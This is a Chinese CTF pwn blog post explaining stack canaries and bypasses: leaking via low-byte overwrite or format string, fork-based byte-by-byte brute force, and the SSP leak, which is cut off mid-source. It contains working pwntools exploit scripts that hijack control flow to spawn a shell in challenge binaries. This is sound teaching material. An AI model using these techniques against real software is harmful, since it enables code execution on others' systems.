<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>栈溢出之Canary | Blu3m00n's blog</title><meta name="keywords" content="PWN"><meta name="author" content="Blu3m00n"><meta name="copyright" content="Blu3m00n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言重新从基础学起，但是会比以前学得更深更透彻 Canary是什么由于栈溢出(stack overflow)而引发的攻击非常普遍也非常古老, 相应地一种叫做canary就出现在gcc&#x2F;glibc里, 直到现在也作为系统安全的第一道防线存在。 canary 实现和设计思想都比较简单, 就是插入一个值, 在stack overflow发生的高危区域的栈空间尾部, 当函数返回之时检测canar">
<meta property="og:type" content="article">
<meta property="og:title" content="栈溢出之Canary">
<meta property="og:url" content="https://whitegive111.github.io/2022/09/13/Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/index.html">
<meta property="og:site_name" content="Blu3m00n&#39;s blog">
<meta property="og:description" content="前言重新从基础学起，但是会比以前学得更深更透彻 Canary是什么由于栈溢出(stack overflow)而引发的攻击非常普遍也非常古老, 相应地一种叫做canary就出现在gcc&#x2F;glibc里, 直到现在也作为系统安全的第一道防线存在。 canary 实现和设计思想都比较简单, 就是插入一个值, 在stack overflow发生的高危区域的栈空间尾部, 当函数返回之时检测canar">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.giaott.com/images/2022/09/13/dC0dZ.jpg">
<meta property="article:published_time" content="2022-09-13T11:42:57.801Z">
<meta property="article:modified_time" content="2022-09-14T15:18:08.884Z">
<meta property="article:author" content="Blu3m00n">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.giaott.com/images/2022/09/13/dC0dZ.jpg"><link rel="shortcut icon" href="https://www.giaott.com/images/2022/08/14/OMVjY.jpg"><link rel="canonical" href="https://whitegive111.github.io/2022/09/13/Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '栈溢出之Canary',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-14 23:18:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://www.giaott.com/images/2022/08/14/OMxzS.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/life/"><i class="fa-fw fas fa-heart"></i><span> 生活</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.giaott.com/images/2022/09/13/dC0dZ.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Blu3m00n's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/life/"><i class="fa-fw fas fa-heart"></i><span> 生活</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">栈溢出之Canary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-13T11:42:57.801Z" title="发表于 2022-09-13 19:42:57">2022-09-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-14T15:18:08.884Z" title="更新于 2022-09-14 23:18:08">2022-09-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="栈溢出之Canary"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>重新从基础学起，但是会比以前学得更深更透彻</p>
<h3 id="Canary是什么"><a href="#Canary是什么" class="headerlink" title="Canary是什么"></a>Canary是什么</h3><p>由于栈溢出(stack overflow)而引发的攻击非常普遍也非常古老, 相应地一种叫做canary就出现在gcc&#x2F;glibc里, 直到现在也作为系统安全的第一道防线存在。</p>
<p>canary 实现和设计思想都比较简单, 就是插入一个值, 在stack overflow发生的高危区域的栈空间尾部, 当函数返回之时检测canary的值是否经过了改变, 以此来判断stack&#x2F;buffer overflow是否发生。</p>
<p>Canary与windows下的GS保护都是防止栈溢出的有效手段，几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。</p>
<h3 id="在GCC中使用Canary"><a href="#在GCC中使用Canary" class="headerlink" title="在GCC中使用Canary"></a><strong>在GCC中使用Canary</strong></h3><p>在GCC中使用以下参数设置Canary:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>

<h3 id="Canary实现原理"><a href="#Canary实现原理" class="headerlink" title="Canary实现原理"></a>Canary实现原理</h3><p>当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。 这个操作即为向栈中插入Canary值，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<p>Canary保护的stack结构大概如下(64位)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>

<p>如果 canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。</p>
<p>这意味可以通过劫持 <code>__stack_chk_fail</code>的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 。</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  <span class="built_in">THREAD_SET_STACK_GUARD</span> (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>

<h2 id="Leak覆盖"><a href="#Leak覆盖" class="headerlink" title="Leak覆盖"></a>Leak覆盖</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>①通过覆盖canary的低字节，使其不再为\x00而可以被puts等输出函数打印</p>
<p>②通过printf格式化字符串泄露canary</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><p><img src="/img/image-20220913201629770.png" alt="image-20220913201629770"></p>
<p>存在着两次输入，第一次输入长度可以达到0x20，通过覆盖canary低字节来打印出canary的值，因为对canary校验是在return前进行的，此时对canary值进行修改并无影响，在覆盖时将低字节还原为\x00即可。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./canary&#x27;</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ru(<span class="string">&#x27;length?\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;25&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;what?\n&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">a=rl()</span><br><span class="line">canary=(u64(a[<span class="number">24</span>:<span class="number">32</span>]))</span><br><span class="line">ru(<span class="string">&#x27;OK!\n&#x27;</span>)</span><br><span class="line">system_add=<span class="number">0x400893</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(system_add)</span><br><span class="line">sl(payload)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p><img src="/img/image-20220914144858795.png" alt="image-20220914144858795"></p>
<p><img src="/img/image-20220914144950632.png" alt="image-20220914144950632"></p>
<p>可以发现在sub_4008eb函数中存在格式化字符串漏洞，但是可以看到并没有栈溢出，因此我们需要去在该处泄露canary之后去其他函数内进行覆盖</p>
<p><img src="/img/image-20220914145254151.png" alt="image-20220914145254151"></p>
<p>很简单的在sub_400960函数处发现了栈溢出漏洞，并且很容易的找到了后门函数</p>
<p><img src="/img/image-20220914145413251.png" alt="image-20220914145413251"></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./Mary_Morton&#x27;</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ru(<span class="string">&#x27;3. Exit the battle \n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>((rl())[<span class="number">2</span>:<span class="number">18</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">ru(<span class="string">&#x27;3. Exit the battle \n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sys_add=<span class="number">0x4008DE</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(sys_add)</span><br><span class="line">s(payload)</span><br><span class="line">rl()</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<h2 id="逐字节爆破"><a href="#逐字节爆破" class="headerlink" title="逐字节爆破"></a>逐字节爆破</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>每次进程重启后的canary不同，且同一个进程中的每个线程的canary也不同。<strong>但是</strong>存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的。我们可以利用这样的特点，逐个字节将canary爆破出来。而fork函数也有个特点，就是父进程fork的返回值是子进程的pid值，而子进程的返回值为0。</p>
<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><p><img src="/img/image-20220913203125657.png" alt="image-20220913203125657"></p>
<p>可以发现在该程序中，父进程的返回值v3大于0，因此会到if中去（保证父进程不崩），而子进程会进入vul函数，在vul中存在着栈溢出与canary，可以通过多个子进程爆破canary值进行绕过</p>
<p><img src="/img/image-20220913203302094.png" alt="image-20220913203302094"></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ru(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">		payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+<span class="built_in">bytes</span>(<span class="built_in">chr</span>(j),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">		s(payload)</span><br><span class="line">		flag=ru(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b&#x27;recv&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">			canary+=<span class="built_in">bytes</span>(<span class="built_in">chr</span>(j),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">log.success(canary)</span><br><span class="line">system=<span class="number">0x08048604</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(system)</span><br><span class="line">s(payload)</span><br><span class="line">shell()</span><br><span class="line"><span class="comment">#在python3中运行时要注意其canary值每个字节不能超过\x80，否则会由于utf-16转为utf-8导致\x80直接变成了\xc2\x80</span></span><br></pre></td></tr></table></figure>

<h2 id="SSP-leak"><a href="#SSP-leak" class="headerlink" title="SSP  leak"></a>SSP  leak</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>我们知道当程序检测到栈溢出时，程序会执行 <strong>stack_chk_fail函数</strong>，具体我们可以看看glibc 2.25版本的该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">		    msg, __libc_argv[<span class="number">0</span>] ?: 